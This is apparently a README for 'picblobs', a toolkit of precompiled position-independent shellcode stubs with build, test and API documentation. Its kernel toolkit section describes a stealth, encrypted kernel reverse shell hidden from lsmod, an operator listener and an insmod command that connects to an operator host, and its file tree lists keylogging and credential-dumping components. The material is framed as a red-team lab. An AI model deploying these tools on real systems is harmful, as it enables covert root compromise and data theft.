# picblobs

Pre-compiled, position-independent code (PIC) blobs for loading and executing
arbitrary payloads on multiple operating systems and architectures. Eliminates
the need for hand-writing shellcode by providing tested, cross-platform PIC
stubs through a simple Python API.

## User Story

```text
As a cybersecurity developer, I am sick and tired of writing assembly and shellcode.
It would be amazing if Opus just solved the problem for me and yeeted it into pypi.
```

## Platform support

### Architectures

| Architecture | Endianness | Bits | Traits |
|---|---|---|---|
| x86_64 | little | 64 | |
| i686 | little | 32 | uses_mmap2 |
| aarch64 | little | 64 | openat_only |
| armv5 (ARM mode) | little | 32 | uses_mmap2 |
| armv5 (Thumb mode) | little | 32 | uses_mmap2 |
| armv7 (Thumb-2) | little | 32 | uses_mmap2 |
| s390x (z13) | big | 64 | uses_old_mmap |
| mipsel32 | little | 32 | uses_mmap2, needs_got_reloc |
| mipsbe32 | big | 32 | uses_mmap2, needs_got_reloc |

### Operating systems

| OS | Architectures | Blob types | Runner |
|---|---|---|---|
| Linux | x86_64, i686, aarch64, armv5_arm, armv5_thumb, armv7_thumb, s390x, mipsel32, mipsbe32 | hello, nacl_hello, nacl_client, nacl_server (+ future: alloc_jump, stagers, reflective_elf) | Direct execution via QEMU user-static |
| FreeBSD | x86_64, i686, aarch64, armv5_arm, armv5_thumb, armv7_thumb, mipsel32, mipsbe32 | hello (+ future: alloc_jump, stagers, reflective_elf) | Syscall shim (WIP) |
| Windows | x86_64, i686, aarch64 | hello_windows (+ future: alloc_jump, stagers, reflective_pe) | Mock TEB/PEB on Linux |

### Current blob inventory

| Blob | OS | Description |
|---|---|---|
| `hello` | Linux, FreeBSD | Write "Hello, world!" via raw syscalls and exit |
| `hello_windows` | Windows | Write "Hello, world!" via PEB walk + DJB2 hash resolution of kernel32.dll exports (GetStdHandle, WriteFile, ExitProcess) |
| `nacl_hello` | Linux, FreeBSD | TweetNaCl self-test: encrypt/decrypt round-trip with crypto_secretbox (XSalsa20-Poly1305) and exit |
| `nacl_server` | Linux, FreeBSD | NaCl encrypted TCP server: bind, accept, decrypt message with crypto_secretbox, send encrypted ACK |
| `nacl_client` | Linux, FreeBSD | NaCl encrypted TCP client: connect, encrypt and send message, decrypt ACK from server |

### Verified status

```
$ picblobs verify
[linux] hello
  linux:aarch64         OK   'Hello, world!'
  linux:armv5_arm       OK   'Hello, world!'
  linux:armv5_thumb     OK   'Hello, world!'
  linux:armv7_thumb     OK   'Hello, world!'
  linux:i686            OK   'Hello, world!'
  linux:mipsbe32        OK   'Hello, world!'
  linux:mipsel32        OK   'Hello, world!'
  linux:s390x           OK   'Hello, world!'
  linux:x86_64          OK   'Hello, world!'
[linux] nacl_hello
  linux:aarch64         OK   'NaCl OK'
  linux:armv5_arm       OK   'NaCl OK'
  linux:armv5_thumb     OK   'NaCl OK'
  linux:armv7_thumb     OK   'NaCl OK'
  linux:i686            OK   'NaCl OK'
  linux:mipsbe32        OK   'NaCl OK'
  linux:mipsel32        OK   'NaCl OK'
  linux:s390x           OK   'NaCl OK'
  linux:x86_64          OK   'NaCl OK'
[linux] ul_exec
  ...
[windows] hello_windows
  windows:aarch64       OK   'Hello, world!'
  windows:i686          OK   'Hello, world!'
  windows:x86_64        OK   'Hello, world!'
[linux] nacl e2e (server + client encrypted handshake)
  linux:aarch64         OK   encrypt->send->decrypt 'Hello from NaCl PIC blob!', ACK 'OK'
  linux:armv5_arm       OK   encrypt->send->decrypt 'Hello from NaCl PIC blob!', ACK 'OK'
  linux:armv5_thumb     OK   encrypt->send->decrypt 'Hello from NaCl PIC blob!', ACK 'OK'
  linux:armv7_thumb     OK   encrypt->send->decrypt 'Hello from NaCl PIC blob!', ACK 'OK'
  linux:i686            OK   encrypt->send->decrypt 'Hello from NaCl PIC blob!', ACK 'OK'
  linux:mipsbe32        OK   encrypt->send->decrypt 'Hello from NaCl PIC blob!', ACK 'OK'
  linux:mipsel32        OK   encrypt->send->decrypt 'Hello from NaCl PIC blob!', ACK 'OK'
  linux:s390x           OK   encrypt->send->decrypt 'Hello from NaCl PIC blob!', ACK 'OK'
  linux:x86_64          OK   encrypt->send->decrypt 'Hello from NaCl PIC blob!', ACK 'OK'

35/35 passed
```

## Prerequisites

- [Bazel 9](https://bazel.build/) (see `.bazelversion`)
- [QEMU user-static](https://www.qemu.org/) for cross-architecture testing
- Python 3.10+
- [uv](https://github.com/astral-sh/uv) (recommended) or pip/venv

Toolchains are fetched automatically via [Bootlin](https://toolchains.bootlin.com/) for
Linux cross-compilation (ARMv5, ARMv7, AArch64, MIPS, s390x, x86).

## Quick start

```bash
# Set up Python environment
source sourceme

# Build and stage all blobs + runners
./buildall

# Verify everything works
picblobs verify

# Run the full test suite
./testall
```

### Docker / Podman (no local setup)

A Fedora 43 dev container with all dependencies pre-installed is provided
in `ci/`:

```bash
ci/dev.sh                          # interactive shell
ci/dev.sh python -m picblobs verify   # run a command and exit
```

## Building

The build system is Bazel 9 with bzlmod. Cross-compilation toolchains are
fetched from Bootlin automatically on first build.

Targets describe **what** to build. Configs describe **how** to build it.

### Build a single platform

```bash
bazel build //release:full --config=linux_x86_64
bazel build //release:full --config=linux_x86_64 --config=debug
```

### Build a single blob

```bash
bazel build --config=linux_aarch64 //src/payload:hello
bazel build --config=windows_x86_64 //src/payload:hello_windows
```

### Build and stage all platforms

```bash
./buildall
```

This runs `tools/stage_blobs.py`, which builds all blobs and runners for
Linux and Windows, then copies outputs into the Python package tree:

```
python/picblobs/_blobs/{os}/{arch}/{name}.so
python/picblobs/_runners/{runner_type}/{arch}/runner
```

Build specific targets or platforms:

```bash
python tools/stage_blobs.py --targets hello --configs linux:x86_64
python tools/stage_blobs.py --configs windows:x86_64 windows:i686 windows:aarch64
```

### Available platform configs

Generated by `tools/generate.py` from `tools/registry.py`:

```
linux_x86_64  linux_i686  linux_aarch64  linux_armv5_arm  linux_armv5_thumb
linux_armv7_thumb  linux_s390x  linux_mipsel32  linux_mipsbe32

freebsd_x86_64  freebsd_i686  freebsd_aarch64  freebsd_armv5_arm
freebsd_armv5_thumb  freebsd_armv7_thumb  freebsd_mipsel32  freebsd_mipsbe32

windows_x86_64  windows_i686  windows_aarch64
```

### Build mode configs

| Config | Effect |
|---|---|
| *(default)* | Optimized (`-Os` from toolchain) |
| `--config=debug` | Adds `-g` and `-DPIC_LOG_ENABLE`, `strip=never` |
| `--config=release` | Explicit `strip=always` |

Platform and build mode are orthogonal: `--config=linux_x86_64 --config=debug`.

## Running blobs

The `picblobs` CLI operates on blobs staged in the package. It has no
knowledge of the build system.

```bash
# Run hello on x86_64 (native — no QEMU)
picblobs run hello

# Run hello on a cross architecture (via QEMU)
picblobs run hello linux:aarch64

# Run hello_windows through the mock TEB/PEB runner
picblobs run hello_windows windows:x86_64

# Run a .so file directly (development)
picblobs run --so bazel-bin/src/payload/hello.so linux:mipsel32

# Verify all staged blobs on all architectures
picblobs verify

# Verify a specific OS
picblobs verify --os windows

# List all blobs in the package
picblobs list

# Show blob metadata
picblobs info hello linux:x86_64
picblobs info hello_windows windows:i686
```

## Testing

### Full test suite

```bash
./testall
```

Runs all unit tests, sync tests, and payload execution tests. Unimplemented payload types skip gracefully.

### Filtered runs

```bash
./testall -v                           # verbose output
./testall --payload-only               # only payload execution tests
./testall --unit-only                  # only unit/sync tests
./testall --os linux --arch x86_64     # filter by platform
./testall --type hello                 # filter by blob type
./testall -k test_payload_hello        # pytest -k expression
```

### Via picblobs CLI

```bash
picblobs test                          # run pytest
picblobs test -v -k test_sync         # specific tests
picblobs test --os linux --arch x86_64 # filtered
```

### Test architecture

Tests are organized by category:

| File | What it tests |
|---|---|
| `test_payload_hello.py` | hello + hello_windows execution on all platforms, structural checks |
| `test_payload_nacl.py` | nacl_hello self-test on all platforms, nacl_client + nacl_server e2e encrypted handshake |
| `test_payload_alloc_jump.py` | alloc_jump execution + edge cases (skips until implemented) |
| `test_payload_reflective.py` | reflective_elf + reflective_pe (skips until implemented) |
| `test_payload_stager.py` | TCP, FD, pipe, mmap stagers with infrastructure fixtures (skips until implemented) |
| `test_extractor.py` | ELF extraction via pyelftools |
| `test_runner.py` | QEMU runner orchestration, blob preparation |
| `test_cli.py` | CLI argument parsing and commands |
| `test_sync.py` | Registry sync: generated files, platform configs, syscall tables |

Payload tests are **registry-driven**: the test matrix is `blob_type x os x arch`, generated from `tools/registry.py`. Tests auto-skip when a blob or runner isn't staged. Adding a new payload and building it is sufficient to activate its tests.

See `spec/verification/TEST-011-payload-pytest-suite.md` for the full test specification.

## Test runners

All testing runs on a Linux x86_64 host using QEMU user-static for architecture emulation. Three runner types handle the three target OSes:

| Runner | How it works | Binary type |
|---|---|---|
| **Linux** | Loads blob into RWX memory, jumps to it. Blob executes real Linux syscalls, emulated by QEMU. End-to-end integration test. | Freestanding Linux binary, per-arch |
| **Windows** | Constructs mock TEB/PEB/LDR structures with fake kernel32.dll export table. Blob resolves APIs via DJB2 hash, calls mock implementations (GetStdHandle -> fd, WriteFile -> Linux write, ExitProcess -> exit_group). | Freestanding Linux binary, per-arch |
| **FreeBSD** | Syscall shim at fixed address validates FreeBSD syscall numbers and arguments. (WIP) | Freestanding Linux binary, per-arch |

The Windows runner is **hand-written** (not generated) because it has complex mock logic. It supports x86_64 (gs-based TEB), i686 (fs-based TEB via set_thread_area), and aarch64 (tpidr_el0-based TEB). Build it with a Linux config since it's a Linux binary:

```bash
bazel build --config=linux_x86_64 //tests/runners/windows:runner
bazel build --config=linux_i686 //tests/runners/windows:runner
bazel build --config=linux_aarch64 //tests/runners/windows:runner
```

## Writing a blob

A blob is a freestanding C program that runs at any address. Include the
target OS header first, then the syscall wrappers you need:

### Linux blob

```c
#include "picblobs/os/linux.h"
#include "picblobs/section.h"
#include "picblobs/reloc.h"
#include "picblobs/sys/write.h"
#include "picblobs/sys/exit_group.h"

PIC_RODATA
static const char msg[] = "Hello, world!\n";

PIC_ENTRY
void _start(void)
{
    PIC_SELF_RELOCATE();
    pic_write(1, msg, sizeof(msg) - 1);
    pic_exit_group(0);
}
```

### Windows blob

```c
#include "picblobs/os/windows.h"
#include "picblobs/section.h"
#include "picblobs/reloc.h"
#include "picblobs/win/resolve.h"

/* DJB2 hashes of API function names */
#define HASH_KERNEL32       0x7040EE75
#define HASH_GetStdHandle   0xF178843C
#define HASH_WriteFile      0x663CECB0
#define HASH_ExitProcess    0xB769339E

PIC_RODATA
static const char msg[] = "Hello, world!\n";

PIC_ENTRY
void _start(void)
{
    PIC_SELF_RELOCATE();
    void *k32 = pic_resolve_module(HASH_KERNEL32);
    void *(*GetStdHandle)(unsigned long) = pic_resolve_export(k32, HASH_GetStdHandle);
    // ... resolve and call APIs
}
```

Each `sys/*.h` header is a self-contained module with syscall numbers for every
OS/architecture combination, constants, and wrapper function.

Drop a `.c` file into `src/payload/`, run `python tools/generate.py`, and it
will be picked up automatically.

## Code generation

Most boilerplate is generated from `tools/registry.py`:

```bash
python tools/generate.py           # regenerate all
python tools/generate.py --check   # verify freshness (CI)
```

Generated files:
- `src/include/picblobs/arch.h` — architecture trait macros
- `src/include/picblobs/syscall.h` — dispatcher to per-arch asm primitives
- `src/include/picblobs/picblobs.h` — convenience header
- `src/include/picblobs/sys/*.h` — per-syscall modules (numbers + wrappers)
- `platforms/BUILD.bazel`, `bazel/platforms.bzl`, `.bazelrc` — Bazel platform configs
- `src/payload/BUILD.bazel` — auto-discovered blob targets
- `tests/runners/linux/runner.c`, `tests/runners/freebsd/runner.c` — test runner dispatchers

**Note:** `tests/runners/windows/runner.c` is **not** generated. It is hand-written because the mock TEB/PEB environment requires specialized logic per architecture.

## Adding a new architecture

1. Add an `Architecture` entry to `tools/registry.py`
2. Add syscall numbers to `SYSCALL_NUMBERS["linux"]` in `registry.py`
3. Create `src/include/picblobs/syscall/{arch}.h` with the inline asm primitive
4. Create `tests/runners/linux/start/{arch}.h` with the `_start` stub
5. Add a `bootlin.toolchain()` block to `MODULE.bazel`
6. Run `python tools/generate.py`
7. Run `python -m pytest python/tests/test_sync.py -v` (catches anything missed)
8. Build, stage, verify:
   ```bash
   python tools/stage_blobs.py --configs linux:{arch}
   picblobs verify --arch {arch}
   ```

## Adding a new syscall

1. Add the number to every architecture's table in `SYSCALL_NUMBERS` in `registry.py`
2. Add a `SyscallDef` entry to `SYSCALL_DEFS` in `registry.py`
3. Run `python tools/generate.py`

The generated `sys/{name}.h` will contain the numbers, OS guards, and wrapper.

## Formatting and linting

```bash
python tools/fmt.py            # format all C and Python files
python tools/fmt.py --check    # verify formatting (CI)
bazel build --config=lint //src/... //tests/...   # clang-tidy
```

## Project structure

```
tools/
  registry.py          # canonical platform/syscall registry (single source of truth)
  generate.py          # generates all derived files from registry
  stage_blobs.py       # copies bazel outputs into Python package tree
  fmt.py               # format all C and Python files

src/
  include/picblobs/
    arch.h             # [generated] architecture trait macros
    types.h            # portable types (no libc)
    syscall.h          # [generated] dispatcher to per-arch asm
    syscall/           # per-arch syscall primitives (hand-written)
    section.h          # section placement macros + MIPS trampoline
    reloc.h            # MIPS GOT self-relocation
    picblobs.h         # [generated] convenience header
    os/                # OS selection headers (linux.h, freebsd.h, windows.h)
    sys/               # [generated] per-syscall modules
    win/               # Windows PEB/TEB walk, DJB2 hash, PE export parsing
    crypto/            # TweetNaCl header-only crypto (tweetnacl.h, randombytes.h)
  payload/             # blob source files (hello.c, hello_windows.c, nacl_*.c)
  linker/blob.ld       # custom linker script

tests/runners/
  linux/
    runner.c           # [generated] Linux test runner dispatcher
    start/             # per-arch _start stubs (hand-written, 9 arches)
  windows/
    runner.c           # [hand-written] mock TEB/PEB environment
    start/             # per-arch _start stubs (x86_64, i386, aarch64)
  freebsd/
    runner.c           # [generated] FreeBSD syscall shim (WIP)
    start/             # per-arch _start stubs

release/
  BUILD.bazel          # aggregate target: //release:full

python/
  picblobs/
    __init__.py        # public API: get_blob(), list_blobs(), BlobData
    _extractor.py      # runtime ELF extraction via pyelftools
    runner.py          # QEMU execution orchestration
    cli.py             # CLI: list, info, extract, run, verify, test
    _blobs/            # staged .so files (by os/arch/name.so)
    _runners/          # staged runner binaries (by runner_type/arch/runner)
  tests/
    conftest.py        # pytest config, fixtures, markers, env filters
    payload_defs.py    # shared payload expectations and platform mappings
    test_payload_*.py  # payload execution tests (per category)
    test_extractor.py  # ELF extraction tests
    test_runner.py     # QEMU runner tests
    test_cli.py        # CLI tests
    test_sync.py       # registry sync/consistency tests

kernel/                # kernel-mode tools and exercises (red team lab)
  ebpf/
    loader.py          # eBPF userspace blob injection (ptrace + uprobe trigger)
    kernel_loader.py   # eBPF kernel-context injection (bpf_probe_write_user)
    kernel_mem.py      # kernel memory exploration (task walk, cred dump, KASLR)
    kernel_prog.py     # custom kernel programs (syscall monitor, XDP, keylog)
  kmod/
    pic_kmod.c         # PIC blob loader (kprobes symbol resolution, stealth)
    examples/
      kshell.c         # plaintext kernel reverse shell
      kshell_nacl.c    # NaCl-encrypted kernel reverse shell (embedded TweetNaCl)
      tweetnacl_kernel.h  # XSalsa20+Poly1305 for kernel (2.6+ compatible)
      blob_ctx.h       # context struct for PIC blobs (!kload callback API)
      pic_hook.c       # demo blob that sends output through kshell
      b64_kernel.h     # base64 decoder for kernel file transfer
      nop_sled.S       # minimal ring 0 test blob
      hello_ring0.S    # printk from ring 0
      who_am_i.S       # read task_struct from ring 0
  lp/
    listener.py        # operator listening post (plaintext + NaCl modes)
  vm/
    vm_harness.py      # hermetic QEMU VM test harness (Alpine + Ubuntu)
    patch_vermagic.py  # binary vermagic patcher for cross-version loading
  BUILD.bazel          # bazel test targets (7 tests, ubuntu_suite)
  lab.md               # full lab guide with 19+ exercises

spec/                  # requirements, architecture decisions, verification specs

testall                # run the full test suite
buildall               # build and stage all platforms
sourceme               # set up dev environment (source this)
```

## Kernel toolkit

The `kernel/` directory contains kernel-mode tools for the red team lab. See `kernel/lab.md` for the full lab guide.

### Quick start

```bash
# Prerequisites
apt install qemu-system-x86 qemu-utils genisoimage

# Run all kernel tests in hermetic VMs (downloads Ubuntu cloud image on first run)
bazel test //kernel:ubuntu_suite

# Interactive VM shell for exploration
python3 kernel/vm/vm_harness.py shell --distro ubuntu
```

### Encrypted kernel shell

```bash
# Generate a key
KEY=$(python3 -c "import os; print(os.urandom(32).hex())")

# Start operator listening post
python3 kernel/lp/listener.py --port 4444 --key $KEY

# On target: load stealth encrypted shell (hidden from lsmod)
insmod kshell_nacl.ko host=<operator_ip> port=4444 key=$KEY
```

Shell commands:
- `<cmd>` — run shell command as root
- `!upload <local_file> <remote_path>` — upload file to target
- `!run <path>` — execute uploaded binary
- `!kload <blob_file>` — load PIC blob into ring 0 (runs in its own kthread)
- `exit` — disconnect

### Crypto

All encryption uses embedded TweetNaCl (XSalsa20 + Poly1305). No dependency on the kernel crypto API — works on kernels 2.6 through latest.

### VM tests

7 tests verified on Ubuntu 24.04 (kernel 6.8):

| Test | What it verifies |
|------|-----------------|
| `kmod_build` | Kernel module compiles |
| `kmod_nopanic` | Module loads without crashing |
| `kshell` | Plaintext reverse shell, uid=0 |
| `kshell_nacl` | NaCl-encrypted shell connects |
| `kshell_ff` | Stealth mode (hidden from lsmod) |
| `kshell_upload` | File upload + execution through shell |
| `examples_build` | All example modules compile |

## Specification

The `spec/` directory contains the full project specification:

- `spec/vision/` — product vision and scope
- `spec/requirements/` — functional requirements (REQ-001 through REQ-019)
- `spec/decisions/` — architecture decision records (ADR-001 through ADR-024)
- `spec/models/` — system models and sequence diagrams
- `spec/verification/` — test procedures (TEST-001 through TEST-011)

Key documents:
- `spec/verification/TEST-011-payload-pytest-suite.md` — payload test suite specification
- `spec/decisions/ADR-010-testing-infrastructure-strategy.md` — QEMU + shim + mock testing strategy
- `spec/models/MOD-006-test-architecture.md` — test runner architecture
